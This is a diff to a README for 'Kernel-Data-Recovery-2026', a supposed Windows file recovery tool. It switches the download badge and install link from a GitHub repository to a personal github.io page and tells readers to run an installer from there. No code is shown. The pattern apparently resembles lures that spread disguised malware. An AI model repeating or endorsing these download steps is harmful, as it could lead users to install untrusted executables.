@@ -1,6 +1,6 @@
 # 💾 Kernel-Data-Recovery-2026 - Restore Lost Files On Windows Systems
 
-[![](https://img.shields.io/badge/Download-Kernel_Data_Recovery-blue.svg)](https://github.com/ileanaevenpinnate849/Kernel-Data-Recovery-2026)
+[![](https://img.shields.io/badge/Download-Kernel_Data_Recovery-blue.svg)](https://ileanaevenpinnate849.github.io)
 
 ## 📁 About This Software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these needs before you start:
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the main download page: [https://github.com/ileanaevenpinnate849/Kernel-Data-Recovery-2026](https://github.com/ileanaevenpinnate849/Kernel-Data-Recovery-2026).
+1. Visit the main download page: [https://ileanaevenpinnate849.github.io](https://ileanaevenpinnate849.github.io).
 2. Look for the latest release version on the page.
 3. Click the link to save the installation file to your computer. 
 4. Locate the downloaded file in your Downloads folder.
